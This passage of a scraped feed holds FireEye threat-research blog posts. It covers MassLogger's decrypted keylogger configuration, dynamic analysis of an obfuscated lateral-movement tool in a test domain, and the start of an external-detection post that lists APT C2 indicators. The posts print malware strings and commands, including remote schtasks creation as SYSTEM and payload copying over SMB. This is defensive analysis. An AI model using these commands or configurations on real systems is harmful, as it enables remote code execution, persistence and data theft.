/>        EnableWindowSearcher:\n          false<br />               ExectionDelay: 6<br />         \n           ExitAfterDelivery: false<br />                   FtpEnable:\n          false<br />                     FtpHost: ftp://127.0.0.1<br />\n                             FtpPass:<br />                     FtpPort:\n          21<br />                     FtpUser: Foo<br />               \n           InstallFile: Pkkbdphw<br />               InstallFolder:\n          %AppData%<br />         InstallSecondFolder: Eqrzwmf<br />   \n                               Key:<br />                       Mutex:\n          Ysjqh<br />                 PanelEnable: false<br />         \n                   PanelHost: http://example.com/panel/upload.php<br />\n           SearchAndUploadExtensions: .jpeg, .txt, .docx, .doc,<br />   \n          SearchAndUploadSizeLimit: 500000<br />     \n          SearchAndUploadZipSize: 5000000<br />               \n          SelfDestruct: false<br />             SendingInterval: 2<br />\n                             Version: MassLogger v1.3.4.0<br />     \n          WindowSearcherKeywords: youtube, facebook, amazon,</span></td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 18: Decrypted configuration</span></p>\n <h4>Conclusion</h4>\n <p>Using a JIT compiler hook to replace the MSIL is a powerful\n  technique that makes static analysis almost impossible. Although this\n  technique is not new, I haven’t seen many .NET malwares making use of\n  it, let alone trying to implement their own adaptation instead of\n  using widely available protectors like ConfuserEx. Hopefully, with\n  this blog post and <span class=\"code\">\n    <a href=\"https://github.com/fireeye/jitm\">JITM</a></span>, analysts\n  will now have the tools and knowledge to defeat MassLogger or any\n  future variants that use a similar technique.</p>\n <p>If this is the type of work that excites you; and, if you thrive to\n  push the state of the art when it comes to malware analysis and\n  reverse engineering, the Front Line Applied Research and Expertise\n  (FLARE) team may be a good place for you. The FLARE team faces fun and\n  exciting challenges on a daily basis; and we are constantly looking\n  for more team members to tackle these challenges head on. Check out <a\n    href=\"https://www.fireeye.com/company/jobs.html\">FireEye’s career\n  page</a> to see if any of our opportunities would be a good fit for you.</p>\n <h4>Contributors (Listed Alphabetically)</h4>\n <ul> <li>Tyler Dean (<a\n    href=\"https://twitter.com/spresec\">@spresec</a>): Technical review\n    of the post</li> <li>Michael Durakovich: Technical review of the\n  post</li> <li>Stephen Eckels (<a\n    href=\"https://github.com/stevemk14ebr/\">@stevemk14ebr</a>): Help\n    with porting JITM to use PolyHook</li> <li>Jon Erickson (<a\n    href=\"https://github.com/evil-e\">@evil-e</a>): Technical review of\n    the post</li> <li>Moritz Raabe (<a\n    href=\"https://twitter.com/m_r_tz?lang=en\">@m_r_tz</a>): Technical\n    review of the post</li> </ul>\n","descriptionType":"html","publishedDate":"Thu, 06 Aug 2020 19:15:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure2.png","linkMd5":"9a7bbc41e123c400b9944084b8bf8adf","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn18@2020_2/2020/08/24/14-11-05-300_868ca874cc15fc4d.webp","destWidth":1008,"destHeight":502,"sourceBytes":142300,"destBytes":28684,"author":"Nhan Huynh","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure2.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn18@2020_2/2020/08/24/14-11-05-300_868ca874cc15fc4d.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure3.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn49@2020_6/2020/08/24/14-11-13-407_0e681d31b305f5e1.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure4.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn37@2020_2/2020/08/24/14-11-14-501_8b65bf13126b028a.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure5.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn19@2020_3/2020/08/24/14-11-10-878_a7b80bdedf5aa030.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure6.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn92@2020_1/2020/08/24/14-11-11-968_016a18ad6237694c.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure7.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn65@2020_1/2020/08/24/14-11-16-863_e60de8805e5ca26c.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure8.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn77@2020_4/2020/08/24/14-11-16-150_4f1cb17d07feb47a.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure9.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn99@2020_5/2020/08/24/14-11-18-184_55eee2c6acc9d990.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure10.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn96@2020_3/2020/08/24/14-11-08-852_8f27adb0ef6ec8ef.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure13.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn75@2020_5/2020/08/24/14-11-09-178_c3ece76475c7aa43.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure15.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn36@2020_6/2020/08/24/14-11-18-390_e1f9b93a7bf109cf.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure16.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn53@2020_2/2020/08/24/14-11-20-266_ba0a49662814eebf.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure17.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn27@2020_2/2020/08/24/14-11-21-299_a6e7e93dd6720d2c.webp"},"publishedOrCreatedDate":1598278264213},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Configuring a Windows Domain to Dynamically Analyze an Obfuscated\nLateral Movement Tool","link":"http://www.fireeye.com/blog/threat-research/2020/07/configuring-windows-domain-dynamically-analyze-obfuscated-lateral-movement-tool.html","description":"<p>We recently encountered a large obfuscated malware sample that\n  offered several interesting analysis challenges. It used\n  virtualization that prevented us from producing a fully-deobfuscated\n  memory dump for static analysis. Statically analyzing a large\n  virtualized sample can take anywhere from several days to several\n  weeks. Bypassing this time-consuming step presented an opportunity for\n  collaboration between the FLARE reverse engineering team and the\n  Mandiant consulting team which ultimately saved many hours of\n  difficult reverse engineering.</p>\n <p>We suspected the sample to be a lateral movement tool, so we needed\n  an appropriate environment for dynamic analysis. Configuring the\n  environment proved to be essential, and we want to empower other\n  analysts who encounter samples that leverage a domain. Here we will\n  explain the process of setting up a virtualized Windows domain to run\n  the malware, as well as the analysis techniques we used to confirm\n  some of the malware functionality.<b></b></p>\n <h4>Preliminary Analysis</h4>\n <p>When analyzing a new malware sample, we begin with basic static\n  analysis, where we can often get an idea of what type of sample it is\n  and what it’s capabilities might be. We can use this to inform the\n  subsequent stages of the analysis process and focus on the relevant\n  data. We begin with a Portable Executable analysis tool such as CFF\n  Explorer. In this case, we found that the sample is quite large at\n  6.64 MB. This usually indicates that the sample includes statically\n  linked libraries such as Boost or OpenSSL, which can make analysis difficult.</p>\n <p>Additionally, we noticed that the import table includes eight\n  dynamically linked DLLs with only one imported function each as shown\n  in Figure 1. This is a common technique used by packers and\n  obfuscators to import DLLs that can later be used for runtime linking,\n  without exposing the actual APIs used by the malware.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture1.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 1: Suspicious imports</span></p>\n <p>Our strings analysis confirmed our suspicion that the malware would\n  be difficult to analyze statically. Because the file is so large,\n  there were over 75,000 strings to consider. We used <a\n  href=\"https://github.com/fireeye/stringsifter\">StringSifter</a> to\n  rank the strings according to relevance to malware analysis, but we\n  did not identify anything useful. Figure 2 shows the most relevant\n  strings according to StringSifter.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture2.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 2: StringSifter output</span></p>\n <p>When we encounter these types of obstacles, we can often turn to\n  dynamic analysis to reveal the malware's behavior. In this case, our\n  basic dynamic analysis provided hope. Upon execution the sample\n  printed a usage statement:</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td><span class=\"code\">Usage: evil.exe [/P:str] [/S[:str]]\n          [/B:str] [/F:str] [/C] [/L:str] [/H:str] [/T:int] [/E:int]\n          [/R]<br />     /P:str -- path to payload file.<br />   \n           /S[:str] -- share for reverse copy.<br />     /B:str -- path\n          to file to load settings from.<br />     /F:str -- write log\n          to specified file.<br />     /C -- write log to console.<br />\n             /L:str -- path to file with host list.<br />     /H:str --\n          host name to process.<br />     /T:int -- maximum number of\n          concurrent threads.<br />     /E:int -- number of seconds to\n          delay before payload deletion (set to 0 to avoid\n          remove).<br />     /R -- remove payload from hosts (/P and /S\n          will be ignored).<br />  If /S specifed without value, random\n          name will be used.<br />  /L and /H can be combined and\n          specified more than once. At least one must present.<br />  /B\n          will be processed after all other flags and will override any\n          specified values (if any).<br />  All parameters are case\n      sensetive.</span></td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 3: Usage statement</span></p>\n <p>We attempted to unpack the sample by suspending the process and\n  dumping the memory. This proved difficult as the malware exited almost\n  instantly and deleted itself. We eventually managed to produce a\n  partially-unpacked memory dump by using the commands in Figure 4.</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td><span class=\"code\">sleep 2 &amp;&amp; evil.exe\n          /P:&quot;C:\\Windows\\System32\\calc.exe&quot; /E:1000 /F:log.txt\n      /H:some_host</span></td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 4: Commands executed to run binary</span></p>\n <p>We chose an arbitrary payload file and a large interval for payload\n  deletion. We also provided a log filename and a hostname for payload\n  execution. These parameters were designed to force a slower execution\n  time so we could suspend the process before it terminated.</p>\n <p>We used <a href=\"https://github.com/glmcdona/Process-Dump\">Process\n  Dump</a> to produce a memory snapshot after the two second delay.\n  Unfortunately, virtualization still hindered static analysis and our\n  sample remained mostly obfuscated, but we did manage to extract some\n  strings which provided the breakthrough we needed.</p>\n <p>Figure 5 shows some of the interesting strings we encountered that\n  were not present in the original binary.</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td><span class=\"code\">dumpedswaqp.exe<br />  psxexesvc<br />\n          schtasks.exe /create /tn &quot;%s&quot; /tr &quot;%s&quot; /s\n          &quot;%s&quot; /sc onstart /ru system /f<br />  schtasks.exe\n          /run /tn &quot;%s&quot; /s &quot;%s&quot;<br />  schtasks.exe\n          /delete /tn &quot;%s&quot; /s &quot;%s&quot; /f<br />\n          ServicesActive<br />  Payload direct-copied<br />  Payload\n          reverse-copied<br />  Payload removed<br />  Task\n          created<br />  Task executed<br />  Task deleted<br />  SM\n          opened<br />  Service created<br />  Service started<br />\n          Service stopped<br />  Service removed<br />  Total hosts: %d,\n          Threads: %d<br />  SHARE_%c%c%c%c<br />  Share &quot;%s&quot;\n          created, path &quot;%s&quot;<br />  Share &quot;%s&quot;\n          removed<br />  Error at hooking API &quot;%S&quot;<br />\n          Dumping first %d bytes:<br />  DllRegisterServer<br />\n          DllInstall<br />  register<br />  install</span></td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 5: Strings output from memory dump</span></p>\n <p>Based on the analysis thus far, we suspected remote system access.\n  However, we were unable to confirm our suspicions without providing an\n  environment for lateral movement. To expedite analysis, we created a\n  virtualized Windows domain.</p>\n <p>This requires some configuration, so we have documented the process\n  here to aid others when using this analysis technique.</p>\n <h4>Building a Test Environment</h4>\n <p>In the test environment, make sure to have clean Windows 10 and\n  Windows Server 2016 (Desktop Experience) virtual machines installed.\n  We recommend creating two Windows Server 2016 machines so the Domain\n  Controller can be separated from the other test systems.</p>\n <p>In VMware Virtual Network Editor on the host system, create a custom\n  network with the following settings:</p>\n <ul> <li>Under VMNet Information, select the “Host-only” radio\n  button.</li> <li>Ensure that “Connect a host virtual adapter” is\n    disabled to prevent connection to the outside world.</li> <li>Ensure\n    that the “Use local DHCP service” option is disabled if static IP\n    addresses will be used.</li> </ul>\n <p>This is demonstrated in Figure 6<b></b>.<b></b></p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture6.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 6: Virtual network adapter configuration</span></p>\n <p>Then, configure the guests’ network adapters to connect to this network.</p>\n <ul> <li>Configure hostnames and static IP addresses for the virtual\n  machines.</li> <li>Choose the domain controller IP as the default\n    gateway and DNS server for all guests. </li> </ul>\n <p>We used the system configurations shown in Figure 7.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture7.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 7: Example system configurations</span></p>\n <p>Once everything is configured, begin by installing Active Directory\n  Domain Services and DNS Server roles onto the designated domain\n  controller server. This can be done by selecting the options shown in\n  Figure 8 via the Windows Server Manager application. The default\n  settings can be used throughout the dialog as roles are added.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture8.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 8: Roles needed on domain controller</span></p>\n <p>Once the roles are installed, run the promotion operation as\n  demonstrated in Figure 9. The promotion option is accessible through\n  the notifications menu (flag icon) once the Active Directory Domain\n  Services role is added to the server. Add a new forest with a fully\n  qualified root domain name such as <i>testdomain.local</i>. Other\n  options may be left as default. Once the promotion process is\n  complete, reboot the system.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture9.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 9: Promoting system to domain\n    controller in Server Manager</span></p>\n <p>Once the domain controller is promoted, create a test user account\n  via <i>Active Directory Users and Computers</i> on the domain\n  controller. An example is shown in Figure 10.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture10.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 10: Test user account</span></p>\n <p>Once the test account is created, proceed to join the other systems\n  on the virtual network to the domain. This can be done through\n  Advanced System Settings as shown in Figure 11. Use the test account\n  credentials to join the system to the domain.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture11.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 11: Configure the domain name for\n    each guest</span></p>\n <p>Once all systems are joined to the domain, verify that each system\n  can ping the other systems. We recommend disabling the Windows\n  Firewall in the test environment to ensure that each system can access\n  all available services of another system in the test environment.</p>\n <p>Give the test account administrative rights on all test systems.\n  This can be done by modifying the local administrator group on each\n  system manually with the command shown in Figure 12 or automated\n  through a <a\n    href=\"https://social.technet.microsoft.com/wiki/contents/articles/20402.active-directory-group-policy-restricted-groups.aspx\">Group\n    Policy Object (GPO)</a>.</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td><span class=\"code\">net localgroup administrators sa_jdoe\n      /ADD</span></td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 12: Command to add user to local\n    administrators group</span></p>\n <h4>Dynamic Analysis on the Domain</h4>\n <p>At this point, we were ready to begin our dynamic analysis. We\n  prepared our test environment by installing and launching Wireshark\n  and Process Monitor. We took snapshots of all three guests and ran the\n  malware in the context of the test domain account on the client as\n  shown in Figure 13.</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td><span class=\"code\">evil.exe\n          /P:&quot;C:\\Windows\\System32\\calc.exe&quot; /L:hostnames.txt\n          /F:log.txt /S /C</span></td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 13: Command used to run the malware</span></p>\n <p>We populated the <i>hostnames.txt</i> file with the following\n  line-delimited hostnames as demonstrated in Figure 14.</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td><span class=\"code\">DBPROD.testdomain.local<br />\n          client.testdomain.local<br />  DC.testdomain.local</span></td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 14: File contents of hostnames.txt</span></p>\n <h4>Packet Capture Analysis</h4>\n <p>Upon analyzing the traffic in the packet capture, we identified SMB\n  connections to each system in the host list. Before the SMB handshake\n  completed, Kerberos tickets were requested. A ticket granting ticket\n  (TGT) was requested for the user, and service tickets were requested\n  for each server as seen in Figure 15. To learn more about the Kerberos\n  authentication protocol, please see <a\n    href=\"https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html\">our\n    recent blog</a> post that introduces the protocol along with a new\n  Mandiant Red Team tool.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture15.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 15: Kerberos authentication process</span></p>\n <p>The malware accessed the <i>C$</i> share over SMB and wrote the file\n  <i>C:\\Windows\\swaqp.exe</i>. It then used RPC to launch <i>SVCCTL</i>,\n  which is used to register and launch services. <i>SVCCTL</i> created\n  the <i>swaqpd</i> service. The service was used to execute the payload\n  and then was subsequently deleted. Finally, the file was deleted, and\n  no additional activity was observed. The traffic is shown in Figure 16.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture16.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 16: Malware behavior observed in\n    packet capture</span></p>\n <p>Our analysis of the malware behavior with Process Monitor confirmed\n  this observation. We then proceeded to run the malware with different\n  command line options and environments. Combined with our static\n  analysis, we were able to determine with confidence the malware\n  capabilities, which include copying a payload to a remote host,\n  installing and running a service, and deleting the evidence afterward.</p>\n <h4>Conclusion</h4>\n <p>Static analysis of a large, obfuscated sample can take dozens of\n  hours. Dynamic analysis can provide an alternate solution, but it\n  requires the analyst to predict and simulate a proper execution\n  environment. In this case we were able to combine our basic analysis\n  fundamentals with a virtualized Windows domain to get the job done. We\n  leveraged the diverse skills available to FireEye by combining FLARE\n  reverse engineering expertise with Mandiant consulting and Red Team\n  experience. This combination reduced analysis time to several hours.\n  We supported an active incident response investigation by quickly\n  extracting the necessary indicators from the compromised host. We hope\n  that sharing this experience can assist others in building their own\n  environment for lateral movement analysis.</p>\n","descriptionType":"html","publishedDate":"Tue, 07 Jul 2020 18:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture1.png","linkMd5":"e1bf3a686b04aa63d07c105c1bc6bebc","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn45@2020_1/2020/08/24/14-11-04-983_1e1af9879f48df91.webp","destWidth":936,"destHeight":458,"sourceBytes":129944,"destBytes":44392,"author":"Matthew Haigh","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn45@2020_1/2020/08/24/14-11-04-983_1e1af9879f48df91.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture2.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn28@2020_1/2020/08/24/14-11-11-258_af9d36c2a49ba309.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture6.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn66@2020_6/2020/08/24/14-11-09-260_c863b143641f517f.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture7.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn7@2020_5/2020/08/24/14-11-21-712_74c010f4667b0d81.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture8.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn100@2020_2/2020/08/24/14-11-19-743_11e84aee28919352.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture9.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn52@2020_1/2020/08/24/14-11-18-473_c98d96e188046d7e.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture10.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn41@2020_6/2020/08/24/14-11-08-910_5323391d00edec82.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture11.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn99@2020_1/2020/08/24/14-11-08-917_e5035b7e3a1c8ce5.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture15.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn31@2020_4/2020/08/24/14-11-11-004_43d7595a23b15c7e.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture16.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn46@2020_6/2020/08/24/14-11-17-490_40e526d90abf0ed4.webp"},"publishedOrCreatedDate":1598278264201},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"SCANdalous! (External Detection Using Network Scan Data and Automation)","link":"http://www.fireeye.com/blog/threat-research/2020/07/scandalous-external-detection-using-network-scan-data-and-automation.html","description":"<h4>Real Quick</h4> \n<p>In case you’re thrown by that fantastic title, our lawyers made us change the name of this project so we wouldn’t get sued. SCANdalous—a.k.a. Scannah Montana a.k.a. Scanny McScanface a.k.a. “Scan I Kick It? (Yes You Scan)”—had another name before today that, for legal reasons, we’re keeping to ourselves. A special thanks to our legal team who is always looking out for us, this blog post would be a lot less fun without them. Strap in folks.</p> \n<h4>Introduction</h4> \n<p>Advanced Practices is known for using primary source data obtained through <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/incident-response.html\">Mandiant Incident Response</a>, <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/managed-detection-and-response.html\">Managed Defense</a>, and product telemetry across thousands of FireEye clients. Regular, first-hand observations of threat actors afford us opportunities to learn intimate details of their modus operandi. While our visibility from organic data is vast, we also derive value from third-party data sources. By looking outwards, we extend our visibility beyond our clients’ environments and shorten the time it takes to detect adversaries in the wild—often before they initiate intrusions against our clients.</p> \n<p>In October 2019, Aaron Stephens gave his <a href=\"https://www.youtube.com/watch?v=x1tEOkY-7JE\">“Scan’t Touch This”</a> talk at the annual FireEye Cyber Defense Summit (slides available <a href=\"https://github.com/aaronst/talks/blob/master/scanttouchthis.pdf\">on his Github</a>). He discussed using network scan data for external detection and provided examples of how to profile command and control (C2) servers for various post-exploitation frameworks used by criminal and intelligence organizations alike. However, manual application of those techniques doesn’t scale. It may work if your role focuses on one or two groups, but Advanced Practices’ scope is much broader. We needed a solution that would enable us to track thousands of groups, malware families and profiles. In this blog post we’d like to talk about that journey, highlight some wins, and for the first time publicly, introduce the project behind it all: SCANdalous.</p> \n<h4>Pre-SCANdalous Case Studies</h4> \n<p>Prior to any sort of system or automation, our team used traditional profiling methodologies to manually identify servers of interest. The following are some examples. The success we found in these case studies served as the primary motivation for SCANdalous.</p> \n<p> <i>APT39 SSH Tunneling</i></p> \n<p>After observing APT39 in a series of intrusions, we determined they frequently created <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html\">Secure Shell (SSH) tunnels with PuTTY Link to forward Remote Desktop Protocol</a> connections to internal hosts within the target environment. Additionally, they preferred using BitVise SSH servers listening on port 443. Finally, they were using servers hosted by WorldStream B.V.</p> \n<p>Independent isolation of any one of these characteristics would produce a lot of unrelated servers; however, the aggregation of characteristics provided a strong signal for newly established infrastructure of interest. We used this established profile and others to illuminate dozens of servers we later attributed to <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html\">APT39</a>, often before they were used against a target.</p> \n<p> <i>APT34 QUADAGENT</i></p> \n<p>In February 2018, an independent researcher shared a sample of what would later be named QUADAGENT. We had not observed it in an intrusion yet; however, by analyzing the characteristics of the C2, we were able to develop a strong profile of the servers to track over time. For example, our team identified the server <span class=\"code\">185.161.208\\.37</span> and domain <span class=\"code\">rdppath\\.com</span> within hours of it being established. A week later, we identified a QUADAGENT dropper with the previously identified C2. Additional examples of QUADAGENT are depicted in Figure 1.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/scandalous/Picture1.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 1: QUADAGENT C2 servers in the Shodan user interface</span></p> \n<p>Five days after the QUADAGENT dropper was identified, Mandiant was engaged by a victim that was targeted via the same C2. This activity was later attributed to APT34. During the investigation, Mandiant uncovered APT34 using RULER.HOMEPAGE. This was the first time our consultants observed the tool and technique used in the wild by a real threat actor. Our team developed a profile of servers hosting HOMEPAGE payloads and began tracking their deployment in the wild. Figure 2 shows a timeline of QUADAGENT C2 servers discovered between February and November of 2018.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/scandalous/Picture2a.jpg\" alt=\"\" /> <span class=\"type-XS\"> <br /> Figure 2: Timeline of QUADAGENT C2 servers discovered throughout 2018</span></p> \n<p> <i>APT33 RULER.HOMEPAGE, POSHC2, and POWERTON</i></p> \n<p>A month after that aforementioned intrusion, Managed Defense discovered a threat actor using RULER.HOMEPAGE to download and execute POSHC2. All the RULER.HOMEPAGE servers were previously identified due to our efforts. Our team developed a profile for POSHC2 and began tracking their deployment in the wild. The threat actor pivoted to a novel PowerShell backdoor, POWERTON. Our team repeated our workflow and began illuminating those C2 servers as well. This activity was later attributed to APT33 and was documented in our&nbsp;<a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html\">OVERRULED&nbsp;post</a>.</p> \n<h4>SCANdalous</h4> \n<p> <i>Scanner, Better, Faster, Stronger</i></p> \n<p>Our use of scan data was proving wildly successful, and we wanted to use more of it, but we needed to innovate. How could we leverage this dataset and methodology to track not one or two, but dozens of active groups that we observe across our solutions and services? Even if every member of Advanced Practices was dedicated to external detection, we would still not have enough time or resources to keep up with the amount of manual work required. But that’s the key word: <i>Manual</i>. Our workflow consumed hours of individual analyst actions, and we had to change that. This was the beginning of SCANdalous: An automated system for external detection using third-party network scan data.</p> \n<p>A couple of nice things about computers: They’re great at multitasking, and they don’t forget. The tasks that were taking us hours to do—if we had time, and if we remembered to do them every day—were now taking SCANdalous minutes if not seconds. This not only afforded us additional time for analysis, it gave us the capability to expand our scope. Now we not only look for specific groups, we also search for common malware, tools and frameworks in general. We deploy weak signals (or broad signatures) for software that isn’t inherently bad, but is often used by threat actors.</p> \n<p>Our external detection was further improved by automating additional collection tasks, executed by SCANdalous upon a discovery—we call them follow-on actions. For example, if an interesting open directory is identified, acquire certain files. These actions ensure the team never misses an opportunity during “non-working hours.” If SCANdalous finds something interesting on a weekend or holiday, we know it will perform the time-sensitive tasks against the server and in defense of our clients.</p> \n<p>The data we collect not only helps us track things we aren’t seeing at our clients, it allows us to provide timely and historical context to our incident responders and security analysts. Taking observations from Mandiant Incident Response or Managed Defense and distilling them into knowledge we can carry forward has always been our bread and butter. Now, with SCANdalous in the mix, we can project that knowledge out onto the Internet as a whole.</p> \n<p> <i>Collection Metrics</i></p> \n<p>Looking back on where we started with our manual efforts, we’re pleased to see how far this project has come, and is perhaps best illustrated by examining the numbers. Today (and as we write these continue to grow), SCANdalous holds over five thousand signatures across multiple sources, covering dozens of named malware families and threat groups. Since its inception, SCANdalous has produced over two million hits. Every single one of those, a piece of contextualized data that helps our team make analytical decisions. Of course, raw volume isn’t everything, so let’s dive a little deeper.</p> \n<p>When an analyst discovers that an IP address has been used by an adversary against a named organization, they denote that usage in our knowledge store. While the time at which this observation occurs does not always correlate with when it was used in an intrusion, knowing when we became aware of that use is still valuable. We can cross-reference these times with data from SCANdalous to help us understand the impact of our external detection.</p> \n<p>Looking at the IP addresses marked by an analyst as observed at a client in the last year, we find that 21.7% (more than one in five) were also found by SCANdalous. Of that fifth, SCANdalous has an average lead time of 47 days. If we only consider the IP addresses that SCANdalous found first, the average lead time jumps to 106 days. Going even deeper and examining this data month-to-month, we find a steady upward trend in the percentage of IP addresses identified by SCANdalous before being observed at a client (Figure 3).</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/scandalous/Picture3.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 3: Percentage of IP addresses found by SCANdalous before being marked as observed at a client by a FireEye analyst</span></p> \n<p>A similar pattern can be seen for SCANdalous’ average lead time over the same data (Figure 4).</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/scandalous/Picture4.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 4: Average lead time in days for SCANdalous over the same data shown in Figure 3</span></p> \n<p>As we continue to create signatures and increase our external detection efforts, we can see from these numbers that the effectiveness and value of the resulting data grow as well.</p> \n<h4>SCANdalous Case Studies</h4> \n<p>Today in Advanced Practices, SCANdalous is a core element of our external detection work. It has provided us with a new lens through which we can observe threat activity on a scale and scope beyond our organic data, and enriches our workflows in support of Mandiant. Here are a few of our favorite examples:</p> \n<p> 